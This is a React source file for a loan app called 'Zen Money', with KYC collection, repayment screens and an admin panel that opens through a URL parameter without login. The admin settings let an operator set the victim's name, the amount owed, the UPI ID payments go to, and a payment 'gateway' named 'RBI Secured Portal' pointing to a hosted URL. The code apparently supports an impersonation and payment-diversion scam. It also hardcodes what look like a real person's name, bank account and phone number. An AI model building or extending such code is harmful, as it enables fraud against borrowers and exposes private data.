import React, { useState, useEffect } from 'react';
import { LoanOrder, INITIAL_ORDERS, lateInfo, money } from './utils/loan';
import { Splash } from './components/Splash';
import { Navigation } from './components/Navigation';
import { HomeScreen } from './components/HomeScreen';
import { NoProductScreen } from './components/NoProductScreen';
import { MyScreen } from './components/MyScreen';
import { CouponScreen } from './components/CouponScreen';
import { InfoScreen } from './components/InfoScreen';
import { PrivacyScreen } from './components/PrivacyScreen';
import { RepayScreen } from './components/RepayScreen';
import { OrdersScreen } from './components/OrdersScreen';
import { OrderDetailScreen } from './components/OrderDetailScreen';
import { RepaymentFlow } from './components/RepaymentFlow';
import { AdminPanel, AdminConfig } from './components/AdminPanel';
import { BankInfoScreen } from './components/BankInfoScreen';
import { BasicInfoScreen } from './components/BasicInfoScreen';
import { KYCDocsScreen } from './components/KYCDocsScreen';
import { LoginPendingScreen } from './components/LoginPendingScreen';
import {
  ContactModal,
  TipsModal,
  AmountSheet,
  LogoutModal,
  InfoViewerModal,
} from './components/Modals';

export type ViewType =
  | 'home'
  | 'nolist'
  | 'my'
  | 'coupon'
  | 'info'
  | 'privacy'
  | 'repay'
  | 'orders'
  | 'detail'
  | 'repay-flow'
  | 'admin'
  | 'bank-info'
  | 'basic-info'
  | 'kyc-docs'
  | 'pending';

export default function App() {
  const [view, setView] = useState<ViewType>(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      if (params.get('admin') === '1' || window.location.pathname.includes('/admin')) {
        return 'admin';
      }
    }
    return 'info'; // Default to info/verification onboarding
  });
  const [activeTab, setActiveTab] = useState<'home' | 'repay' | 'my'>('home');
  const [orders, setOrders] = useState<LoanOrder[]>(INITIAL_ORDERS);
  const [selectedOrderIndex, setSelectedOrderIndex] = useState<number>(0);
  const [ordersTitle, setOrdersTitle] = useState<string>('My Order');
  const [cameFrom, setCameFrom] = useState<'my' | 'repay'>('my');
  const [detailFrom, setDetailFrom] = useState<'orders' | 'repay'>('orders');

  // Repayment Flow state
  const [activeRepayOrder, setActiveRepayOrder] = useState<LoanOrder | null>(null);
  const [repayFlowOrigin, setRepayFlowOrigin] = useState<'repay' | 'detail'>('repay');

  // Verification form data states
  const [bankData, setBankData] = useState({
    ifsc: 'PUNB0023510',
    account: '02352191006858',
    confirmAccount: '0235 2191 0068 58',
    bankName: 'Punjab National Bank',
    state: 'Maharashtra',
    district: 'Mumbai',
    branch: 'Andheri West',
  });

  const [basicData, setBasicData] = useState({
    gender: 'Male',
    education: 'Senior Secondary',
    maritalStatus: 'Married',
    kids: '2',
    employment: 'Others',
    monthlySalary: '30,000 - 50,000',
    contact1Rel: 'Spouse',
    contact1Name: 'VB - 8080609607',
    contact2Rel: 'Friends',
    contact2Name: 'Arvind Arvadiya - 977358...',
  });

  const [kycData, setKycData] = useState({
    facePhoto: '',
    panPhoto: '',
  });

  // Admin configuration state
  const [adminConfig, setAdminConfig] = useState<AdminConfig>({
    appName: 'Zen Money',
    appLogo: 'Zen Money',
    customerName: 'BHAVIK KAMLESH SANGHVI',
    bankAddress: 'HDFC BANK, ANDHERI (W), MUMBAI',
    remainingAmount: 12540,
    loanAmount: 11000,
    paidAmount: 0,
    dueDate: '2026-11-02',
    receivedDate: '23-10-2026',
    upiId: 'kbin972-1@okhdfcbank',
    activeGateway: 'gateway1',
    gateway2Name: 'RBI Secured Portal (Render)',
    gateway2UpiId: 'rbi.secured@hdfcbank',
    gateway2Url: 'https://payment-portal-rbisecured.onrender.com',
    utrIcon: 'review',
    utrStatus: 'Under Review',
    linkTimeMinutes: 10,
    verificationStatus: 'pending',
  });

  // Check URL params for admin mode on initial load
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('admin') === '1' || window.location.pathname.includes('/admin')) {
      setView('admin');
    }
  }, []);

  // Modals
  const [contactOpen, setContactOpen] = useState(false);
  const [tipsOpen, setTipsOpen] = useState(false);
  const [amountOrder, setAmountOrder] = useState<LoanOrder | null>(null);
  const [logoutOpen, setLogoutOpen] = useState(false);
  const [infoViewerType, setInfoViewerType] = useState<'bank' | 'basic' | 'kyc' | null>(null);

  // Toasts
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [gtoastMessage, setGtoastMessage] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage(null);
    }, 1600);
  };

  const showGtoast = (msg: string) => {
    setGtoastMessage(msg);
    setTimeout(() => {
      setGtoastMessage(null);
    }, 1600);
  };

  // Keyboard escape handler for modals
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        setContactOpen(false);
        setTipsOpen(false);
        setAmountOrder(null);
        setLogoutOpen(false);
        setInfoViewerType(null);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Navigation handlers
  const handleSelectTab = (tab: 'home' | 'repay' | 'my') => {
    if (adminConfig.verificationStatus !== 'approved') {
      showToast('Please complete KYC and wait for Admin approval first.');
      setView('info');
      return;
    }
    setActiveTab(tab);
    setView(tab);
    window.scrollTo(0, 0);
  };

  const handleGetCredit = () => {
    setView('nolist');
    window.scrollTo(0, 0);
  };

  const handleOpenOrders = (from: 'my' | 'repay', title: string) => {
    setCameFrom(from);
    setOrdersTitle(title);
    setView('orders');
    window.scrollTo(0, 0);
  };

  const handleOpenDetail = (index: number, from: 'orders' | 'repay') => {
    setSelectedOrderIndex(index);
    setDetailFrom(from);
    setView('detail');
    window.scrollTo(0, 0);
  };

  const handleRepayNow = (order: LoanOrder, origin: 'repay' | 'detail') => {
    setActiveRepayOrder(order);
    setRepayFlowOrigin(origin);
    setView('repay-flow');
    window.scrollTo(0, 0);
  };

  const handleRepaySuccess = (paidOrder: LoanOrder, amountPaid: number, utr: string) => {
    setOrders((prev) =>
      prev.map((o) => {
        if (o.no === paidOrder.no) {
          return {
            ...o,
            st: 'Repaid',
            k: 'paid',
            al: 'Loan amount',
            repaidAt: new Date().toLocaleDateString('en-IN'),
          };
        }
        return o;
      })
    );

    showToast(`Payment of ₹${Number(amountPaid).toFixed(2)} verified (UTR: ${utr})!`);
    setActiveRepayOrder(null);
    setView('repay');
    setActiveTab('repay');
  };

  const handleInfoCardClick = (cardType: 'bank' | 'basic' | 'kyc') => {
    if (cardType === 'bank') setView('bank-info');
    else if (cardType === 'basic') setView('basic-info');
    else if (cardType === 'kyc') setView('kyc-docs');
    window.scrollTo(0, 0);
  };

  const handleApplyAndOpenCustomer = (newConfig: AdminConfig) => {
    setAdminConfig(newConfig);
    showToast('Customer configuration applied!');
    setView('repay');
    setActiveTab('repay');
    window.scrollTo(0, 0);
  };

  const handleApproveUser = () => {
    setAdminConfig((prev) => ({
      ...prev,
      verificationStatus: 'approved',
    }));
    showToast('User verification approved successfully!');
    setView('repay');
    setActiveTab('repay');
  };

  const isNavVisible =
    adminConfig.verificationStatus === 'approved' &&
    (view === 'home' || view === 'nolist' || view === 'my' || view === 'repay');

  return (
    <>
      {view !== 'admin' && view !== 'pending' && <Splash onFinished={() => {}} />}

      {/* Mode Switcher */}
      {view === 'admin' && (
        <div className="fixed bottom-20 right-3 z-50 flex flex-col items-end gap-1 select-none">
          <button
            type="button"
            id="switchToCustomerBtn"
            onClick={() => setView('repay')}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-neutral-900 text-white text-xs font-semibold shadow-lg hover:bg-neutral-800 active:scale-95 transition-all cursor-pointer border border-neutral-700"
          >
            <span>📱</span>
            <span>Customer View</span>
          </button>
        </div>
      )}

      {view === 'admin' ? (
        <AdminPanel
          currentConfig={adminConfig}
          orders={orders}
          onUpdateConfig={(cfg) => setAdminConfig(cfg)}
          onUpdateOrders={(newOrders) => setOrders(newOrders)}
          onApplyAndOpenCustomer={handleApplyAndOpenCustomer}
          onCloseAdmin={() => setView(adminConfig.verificationStatus === 'approved' ? 'repay' : 'info')}
          onApproveUser={handleApproveUser}
        />
      ) : view === 'pending' ? (
        <LoginPendingScreen
          customerName={adminConfig.customerName}
          onCheckStatus={() => {
            if (adminConfig.verificationStatus === 'approved') {
              showToast('Approved! Entering app.');
              setView('repay');
              setActiveTab('repay');
            } else {
              showToast('Still under review by Admin.');
            }
          }}
          onOpenAdmin={() => setView('admin')}
        />
      ) : view === 'bank-info' ? (
        <BankInfoScreen
          initialData={bankData}
          onBack={() => setView('info')}
          onSave={(data) => {
            setBankData(data);
            showToast('Bank Info saved successfully!');
            setView('info');
          }}
        />
      ) : view === 'basic-info' ? (
        <BasicInfoScreen
          initialData={basicData}
          onBack={() => setView('info')}
          onSave={(data) => {
            setBasicData(data);
            showToast('Basic Info saved successfully!');
            setView('info');
          }}
        />
      ) : view === 'kyc-docs' ? (
        <KYCDocsScreen
          initialData={kycData}
          onBack={() => setView('info')}
          onSave={(data) => {
            setKycData(data);
            showToast('KYC Documents submitted for verification!');
            setAdminConfig((prev) => ({
              ...prev,
              userSubmission: {
                ifsc: bankData.ifsc,
                account: bankData.account,
                gender: basicData.gender,
                education: basicData.education,
                monthlySalary: basicData.monthlySalary,
                submittedAt: new Date().toLocaleString(),
              },
            }));
            setView('pending');
          }}
        />
      ) : view === 'repay-flow' && activeRepayOrder ? (
        <RepaymentFlow
          order={activeRepayOrder}
          adminConfig={adminConfig}
          onBack={() => {
            setView(repayFlowOrigin);
            window.scrollTo(0, 0);
          }}
          onPaymentSuccess={handleRepaySuccess}
        />
      ) : (
        <div id="app" className={`view-${view}`}>
          {view === 'home' && (
            <HomeScreen
              onGetCredit={handleGetCredit}
              onOpenContact={() => setContactOpen(true)}
            />
          )}

          {view === 'nolist' && (
            <NoProductScreen
              onBack={() => setView('home')}
              onOpenContact={() => setContactOpen(true)}
            />
          )}

          {view === 'my' && (
            <MyScreen
              onOpenOrders={() => handleOpenOrders('my', 'My Order')}
              onOpenInfo={() => setView('info')}
              onOpenCoupon={() => setView('coupon')}
              onOpenPrivacy={() => setView('privacy')}
              onOpenContact={() => setContactOpen(true)}
              onCheckUpdate={() => setTipsOpen(true)}
              onLogout={() => setLogoutOpen(true)}
            />
          )}

          {view === 'coupon' && (
            <CouponScreen
              onBack={() => setView('my')}
              onToast={showToast}
            />
          )}

          {view === 'info' && (
            <InfoScreen
              onBack={() => setView('my')}
              onCardClick={handleInfoCardClick}
            />
          )}

          {view === 'privacy' && (
            <PrivacyScreen onBack={() => setView('my')} />
          )}

          {view === 'repay' && (
            <RepayScreen
              orders={orders}
              onOpenOrderHistory={() => handleOpenOrders('repay', 'Order History')}
              onOpenDetail={(i) => handleOpenDetail(i, 'repay')}
              onOpenAmount={(o) => setAmountOrder(o)}
              onRepayNow={(o) => handleRepayNow(o, 'repay')}
            />
          )}

          {view === 'orders' && (
            <OrdersScreen
              orders={orders}
              title={ordersTitle}
              onBack={() => setView(cameFrom)}
              onOpenDetail={(i) => handleOpenDetail(i, 'orders')}
            />
          )}

          {view === 'detail' && orders[selectedOrderIndex] && (
            <OrderDetailScreen
              order={orders[selectedOrderIndex]}
              orderIndex={selectedOrderIndex}
              onBack={() => setView(detailFrom)}
              onOpenAmount={(o) => setAmountOrder(o)}
              onRepayNow={(o) => handleRepayNow(o, 'detail')}
            />
          )}
        </div>
      )}

      {isNavVisible && (
        <Navigation activeTab={activeTab} onSelectTab={handleSelectTab} />
      )}

      {/* Popups and Modals */}
      <ContactModal
        isOpen={contactOpen}
        onClose={() => setContactOpen(false)}
        onToast={showToast}
      />

      <TipsModal
        isOpen={tipsOpen}
        onClose={() => setTipsOpen(false)}
      />

      <AmountSheet
        isOpen={!!amountOrder}
        order={amountOrder}
        onClose={() => setAmountOrder(null)}
      />

      <LogoutModal
        isOpen={logoutOpen}
        onClose={() => setLogoutOpen(false)}
        onConfirm={() => {
          setLogoutOpen(false);
          showToast('Logged out successfully');
          setView('info');
        }}
      />

      <InfoViewerModal
        isOpen={!!infoViewerType}
        type={infoViewerType}
        onClose={() => setInfoViewerType(null)}
      />

      {/* Toast notifications */}
      <div id="toast" className={toastMessage ? 'on' : ''} role="status">
        {toastMessage}
      </div>
      <div id="gtoast" className={gtoastMessage ? 'on' : ''} role="status">
        {gtoastMessage}
      </div>
    </>
  );
}
